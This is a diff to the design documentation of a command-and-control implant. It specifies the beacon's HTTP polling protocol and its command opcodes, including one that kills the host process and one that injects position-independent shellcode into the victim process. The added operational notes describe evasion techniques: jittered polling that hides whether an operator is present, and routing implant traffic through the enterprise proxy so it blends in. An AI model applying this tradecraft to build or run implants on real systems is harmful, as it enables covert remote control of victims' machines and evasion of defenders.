@@ -80,9 +80,13 @@ Identical to the jscript-agent's contract (spoken against the HTTP relay's root)
   POST.
 - Every successful answer is a `200` whose body is the same frame stream of queued commands —
   a command frame is `[opcode:byte][corrId:u32le][payload]`, batched up to 32 frames / 4 MiB;
-  an empty body = nothing queued (re-POST immediately). Any non-200 or transport failure
-  (a redirect included — auto-follow is disabled) is fatal — the loop unwinds, no retry.
-- The relay holds each request server-side for a random 25–35 s; the request timeout is 60 s.
+  an empty body = nothing queued (re-POST immediately when the relay HELD the request — see
+  the pacing note below). Any non-200 or transport failure (a redirect included — auto-follow
+  is disabled) is fatal — the loop unwinds, no retry.
+- The relay holds each request server-side for a random 25–35 s **while a C2 panel is
+  attached**; detached, it answers an immediate empty 200. The agent detects an unheld
+  answer (it returned faster than any hold could) and sleeps the hold window locally, so
+  the request timeout (60 s) only ever bounds a STALLED relay.
 
 ### Commands
 
@@ -90,8 +94,26 @@ Identical to the jscript-agent's contract (spoken against the HTTP relay's root)
 |---|---|---|
 | `0x0A` | Exit | Kills the host process (and any agent injected into it). No reply. |
 | `0x0B` | UpgradeNetFramework | Replies status `2` (the deserialization upgrade is the JScript agent's — this breed is already native). |
-| `0x0C` | UpgradeNative | Payload after the opcode: `[binLen:u32le][PIC binary][NAME=value env lines]` (same env-line style as the `0x0B` headers). The PIC bytes ride the command; `W_URL` (the relay the injected WebSocket agent reads from the process env) is the only current env line. Replies `[status][corrId]`: `1` = failed / nothing to inject (a pre-injection failure — bad payload length, or an exception in the injection steps). A SUCCESSFUL injection sends NO reply: the PIC entry point never returns (every path ends in ExitProcess), so the C2's wait for a 0x0C status times out and success is observed by the WebSocket agent appearing on the relay; a `0` is reachable only from payloads that return (lab stubs). |
+| `0x0C` | UpgradeNative | Payload after the opcode: `[binLen:u32le][PIC binary][NAME=value env lines]` (same env-line style as the `0x0B` headers). The PIC bytes ride the command. `W_URL` (the relay the injected WebSocket agent reads from the process env) is **the only name the env lines may set — a whitelist, not an arbitrary-setenv primitive**: any other NAME is ignored, and lines containing non-ASCII bytes are rejected whole (ASCII best-fit would silently mangle them into a broken URL). A missing OR empty `W_URL` refuses the injection (status `1`) — the PIC exits the host process when its URL is absent or empty, so a W_URL-less 0x0C is a command that would kill the host on arrival. Replies `[status][corrId]`: `1` = failed / nothing to inject (a pre-injection failure — bad payload length, a refused W_URL, or an exception in the injection steps). A SUCCESSFUL injection sends NO reply: the PIC entry point never returns (every path ends in ExitProcess), so the C2's wait for a 0x0C status times out and success is observed by the WebSocket agent appearing on the relay; a `0` is reachable only from payloads that return (lab stubs). |
 | other | unknown | Replies u32 `2`. |
+
+### Operational notes
+
+- **Detached-relay pacing.** The relay holds a poll only while a C2 panel is attached; with
+  no panel attached it answers an immediate empty 200. The agent detects the unheld answer
+  (it came back faster than any hold could have) and sleeps the hold window locally
+  (25–35 s, jittered): the POST cadence stays ~1 per 30 s whether or not an operator is
+  watching — the request rate never reveals operator presence, and neither the victim's
+  CPU nor the relay ever sees a request storm.
+- **Corrupted-payload boundary.** `0x0C` jumps into the delivered bytes by design; there is
+  no managed containment for a fault INSIDE native payload code (on CLR4 an access
+  violation is a corrupted-state exception no catch block survives). A corrupted or
+  truncated PIC therefore dies loudly on the victim — payload integrity is the C2's
+  responsibility upstream (it fetches, validates, and embeds the bytes; TLS guards the wire).
+- **System proxy.** The beacon uses the machine's default (WinInet/IE) proxy — deliberate:
+  enterprise egress usually requires it, and implant traffic blending into the host's own
+  proxy usage is the posture this agent takes. The tradeoff: the identity headers are
+  visible to that proxy's logs.
 
 ## Build
 
